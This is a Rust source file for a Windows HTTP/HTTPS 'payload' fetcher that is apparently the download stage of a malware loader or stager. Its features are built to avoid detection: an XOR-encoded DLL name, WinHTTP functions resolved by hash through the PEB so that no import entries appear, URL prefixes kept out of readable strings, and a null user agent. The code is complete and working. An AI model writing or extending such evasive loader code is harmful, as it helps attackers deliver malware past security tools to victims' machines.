// WinHTTP fetcher. winhttp.dll is a RUNTIME dependency only — the name is
// XOR-encoded (see encoded_strings::ENC_WINHTTP_DLL_W) and loaded through
// LoadLibraryW; every WinHttp* entry point is resolved out of the shared
// DJB2 export cache after peb::ensure_winhttp() populates it. No winhttp
// import directory entry is added to the PE.

#![allow(non_camel_case_types, non_snake_case)]

use core::mem;
use core::ptr;

use alloc::vec::Vec;

use crate::{hashes, native, peb};
use native::{HANDLE, PVOID};

// ---- WinHTTP constants (subset we need) ----
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE:               u32 = 0x00800000;
const DEFAULT_HTTP_PORT:  u16 = 80;
const DEFAULT_HTTPS_PORT: u16 = 443;

// 32 MiB ceiling — matches the C port's MAX_PAYLOAD_SIZE.
const MAX_PAYLOAD: usize = 32 * 1024 * 1024;

// ---- Function-pointer types for the eight resolved WinHttp* exports ----
type WinHttpOpenFn = unsafe extern "system" fn(
    *const u16, u32, *const u16, *const u16, u32,
) -> HANDLE;
type WinHttpConnectFn = unsafe extern "system" fn(
    HANDLE, *const u16, u16, u32,
) -> HANDLE;
type WinHttpOpenRequestFn = unsafe extern "system" fn(
    HANDLE, *const u16, *const u16, *const u16,
    *const u16, *const *const u16, u32,
) -> HANDLE;
type WinHttpSendRequestFn = unsafe extern "system" fn(
    HANDLE, *const u16, u32, PVOID, u32, u32, usize,
) -> i32;
type WinHttpReceiveResponseFn    = unsafe extern "system" fn(HANDLE, PVOID) -> i32;
type WinHttpQueryDataAvailableFn = unsafe extern "system" fn(HANDLE, *mut u32) -> i32;
type WinHttpReadDataFn           = unsafe extern "system" fn(
    HANDLE, *mut u8, u32, *mut u32,
) -> i32;
type WinHttpCloseHandleFn        = unsafe extern "system" fn(HANDLE) -> i32;

// ================================================================
// URL parse — accepts http:// or https:// (case-insensitive prefix).
// Returns (host, port, path, is_https). The slices are borrowed from the
// input URL; the caller owns the backing storage.
// ================================================================
pub fn parse_url(url: &[u8]) -> Option<(&[u8], u16, &[u8], bool)> {
    // Inline byte-by-byte prefix test: each b'x' becomes an immediate
    // operand so neither "http://" nor "https://" sits in .rdata.
    let (rest, is_https) = if url.len() >= 8
        && to_lower(url[0]) == b'h' && to_lower(url[1]) == b't'
        && to_lower(url[2]) == b't' && to_lower(url[3]) == b'p'
        && to_lower(url[4]) == b's' && url[5] == b':'
        && url[6] == b'/' && url[7] == b'/'
    {
        (&url[8..], true)
    } else if url.len() >= 7
        && to_lower(url[0]) == b'h' && to_lower(url[1]) == b't'
        && to_lower(url[2]) == b't' && to_lower(url[3]) == b'p'
        && url[4] == b':' && url[5] == b'/' && url[6] == b'/'
    {
        (&url[7..], false)
    } else {
        return None;
    };

    // Authority ends at the first '/'; the remainder (incl. the '/') is the path.
    let mut auth_end = rest.len();
    for (i, &b) in rest.iter().enumerate() {
        if b == b'/' { auth_end = i; break; }
    }
    let auth = &rest[..auth_end];
    let path = if auth_end < rest.len() { &rest[auth_end..] } else { b"/" };

    // Split authority into host[:port].
    let mut host_end = auth.len();
    let mut port_off: Option<usize> = None;
    for (i, &b) in auth.iter().enumerate() {
        if b == b':' { host_end = i; port_off = Some(i + 1); break; }
    }
    let host = &auth[..host_end];
    if host.is_empty() { return None; }

    let default_port = if is_https { DEFAULT_HTTPS_PORT } else { DEFAULT_HTTP_PORT };
    let port = match port_off {
        Some(o) => {
            let digits = &auth[o..];
            if digits.is_empty() { return None; }
            let mut p: u32 = 0;
            for &b in digits {
                if !(b'0'..=b'9').contains(&b) { return None; }
                p = p * 10 + (b - b'0') as u32;
                if p > 65535 { return None; }
            }
            if p == 0 { return None; }
            p as u16
        }
        None => default_port,
    };

    Some((host, port, path, is_https))
}

#[inline]
fn to_lower(b: u8) -> u8 {
    if b >= b'A' && b <= b'Z' { b + 32 } else { b }
}

// ASCII byte slice -> NUL-terminated UTF-16LE Vec<u16>.
fn ascii_to_wide(s: &[u8]) -> Vec<u16> {
    let mut v: Vec<u16> = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

// ================================================================
// fetch — download a URL's body over HTTP or HTTPS.
//
// Resolves winhttp.dll at runtime (XOR-decoded wide name, LoadLibraryW),
// then calls the 8 WinHttp* entry points through hash-resolved pointers.
// TLS: for https:// we pass WINHTTP_FLAG_SECURE and let WinHTTP do the
// handshake against the OS cert store — no pinning (v1).
// ================================================================
pub fn fetch(url: &[u8]) -> Result<Vec<u8>, i32> {
    // 1. Parse URL.
    let (host, port, path, is_https) = parse_url(url).ok_or(-1i32)?;

    // 2. Ensure winhttp is loaded + its export cache is populated.
    peb::ensure_winhttp().map_err(|_| -2i32)?;

    // 3. Resolve the eight WinHttp* exports from the shared cache.
    let open_va    = peb::resolve_by_hash(hashes::WH_OPEN).map_err(|_| -3i32)?;
    let conn_va    = peb::resolve_by_hash(hashes::WH_CONNECT).map_err(|_| -3i32)?;
    let oreq_va    = peb::resolve_by_hash(hashes::WH_OPEN_REQUEST).map_err(|_| -3i32)?;
    let send_va    = peb::resolve_by_hash(hashes::WH_SEND_REQUEST).map_err(|_| -3i32)?;
    let recv_va    = peb::resolve_by_hash(hashes::WH_RECEIVE_RESPONSE).map_err(|_| -3i32)?;
    let qavail_va  = peb::resolve_by_hash(hashes::WH_QUERY_AVAIL).map_err(|_| -3i32)?;
    let read_va    = peb::resolve_by_hash(hashes::WH_READ_DATA).map_err(|_| -3i32)?;
    let close_va   = peb::resolve_by_hash(hashes::WH_CLOSE).map_err(|_| -3i32)?;

    let wh_open:    WinHttpOpenFn               = unsafe { mem::transmute(open_va)   };
    let wh_conn:    WinHttpConnectFn            = unsafe { mem::transmute(conn_va)   };
    let wh_oreq:    WinHttpOpenRequestFn        = unsafe { mem::transmute(oreq_va)   };
    let wh_send:    WinHttpSendRequestFn        = unsafe { mem::transmute(send_va)   };
    let wh_recv:    WinHttpReceiveResponseFn    = unsafe { mem::transmute(recv_va)   };
    let wh_qavail:  WinHttpQueryDataAvailableFn = unsafe { mem::transmute(qavail_va) };
    let wh_read:    WinHttpReadDataFn           = unsafe { mem::transmute(read_va)   };
    let wh_close:   WinHttpCloseHandleFn        = unsafe { mem::transmute(close_va)  };

    // 4. Widen host + path for WinHTTP.
    let host_w = ascii_to_wide(host);
    let path_w = ascii_to_wide(path);

    // 5. Session (NULL UA — simplest; servers accept empty UA, and we keep
    //    zero plaintext UA strings in .rdata).
    let h_sess = unsafe {
        wh_open(
            ptr::null(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        )
    };
    if h_sess.is_null() { return Err(-4i32); }

    // 6. Connect.
    let h_conn = unsafe { wh_conn(h_sess, host_w.as_ptr(), port, 0) };
    if h_conn.is_null() {
        unsafe { wh_close(h_sess); }
        return Err(-5i32);
    }

    // 7. Open request. NULL verb -> defaults to GET; NULL version -> HTTP/1.1.
    let flags = if is_https { WINHTTP_FLAG_SECURE } else { 0 };
    let h_req = unsafe {
        wh_oreq(
            h_conn,
            ptr::null(),            // verb (NULL = GET)
            path_w.as_ptr(),
            ptr::null(),            // version
            ptr::null(),            // referrer
            ptr::null(),            // accept types
            flags,
        )
    };
    if h_req.is_null() {
        unsafe { wh_close(h_conn); wh_close(h_sess); }
        return Err(-6i32);
    }

    // 8. Send + receive headers.
    if unsafe { wh_send(h_req, ptr::null(), 0, ptr::null_mut(), 0, 0, 0) } == 0 {
        unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
        return Err(-7i32);
    }
    if unsafe { wh_recv(h_req, ptr::null_mut()) } == 0 {
        unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
        return Err(-8i32);
    }

    // 9. Drain body, chunk-by-chunk, with the 32 MiB cap.
    let mut body: Vec<u8> = Vec::new();
    loop {
        let mut avail: u32 = 0;
        if unsafe { wh_qavail(h_req, &mut avail) } == 0 {
            unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
            return Err(-9i32);
        }
        if avail == 0 { break; }

        let want = avail as usize;
        if body.len() + want > MAX_PAYLOAD {
            unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
            return Err(-10i32);
        }

        let start = body.len();
        body.resize(start + want, 0u8);

        let mut got: u32 = 0;
        let ok = unsafe {
            wh_read(h_req, body.as_mut_ptr().add(start), want as u32, &mut got)
        };
        if ok == 0 {
            unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
            return Err(-11i32);
        }
        // Shrink to the actual bytes read (got <= want).
        body.truncate(start + got as usize);
        if got == 0 { break; }
    }

    unsafe { wh_close(h_req); wh_close(h_conn); wh_close(h_sess); }
    Ok(body)
}

